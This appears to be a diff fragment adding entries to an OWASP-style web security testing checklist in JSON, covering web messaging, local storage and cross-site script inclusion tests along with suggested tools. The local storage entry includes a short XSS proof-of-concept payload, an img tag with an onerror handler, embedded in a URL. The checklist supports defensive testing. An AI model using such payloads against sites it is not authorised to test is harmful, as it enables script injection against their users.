+            "description": "Analyse JavaScript code looking for how Web Messaging is implemented. How the website is restricting messages from untrusted domain and how the data is handled even for trusted domains",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-CLNT-12",
+            "test_name": "Test Local Storage",
+            "description": "Determine whether the website is storing sensitive data in the storage. XSS in localstorage  http://server/StoragePOC.html#<img src=x onerror=alert(1)>",
+            "tools": [
+              "Chrome",
+              "Firebug",
+              "Burp Proxy",
+              "ZAP"
+            ]
+          },
+          {
+            "id": "WSTG-CLNT-13",
+            "test_name": "Testing for Cross Site Script Inclusion",
+            "description": "Identify which endpoints are responsible for sending sensitive data, what parameters are required, and identify all relevant dynamically and statically generated JavaScript responses using authenticated user sessions. Pay special attention to sensitive data sent using JSONP. To find dynamically generated JavaScript responses, generate authenticated and unauthenticated requests, then compare them. If they're different, it means the response is dynamic; otherwise it's static. To simplify this task, a tool such as Veit Hailperin's Burp proxy plugin can be used. Make sure to check other file types in addition to JavaScript; XSSI is not limited to JavaScript files alone.",
+            "tools": [
+              "Burp Proxy",
+              "ZAP"
+            ]
+          }
+        ]
+      }
+    ]
+  }
+}
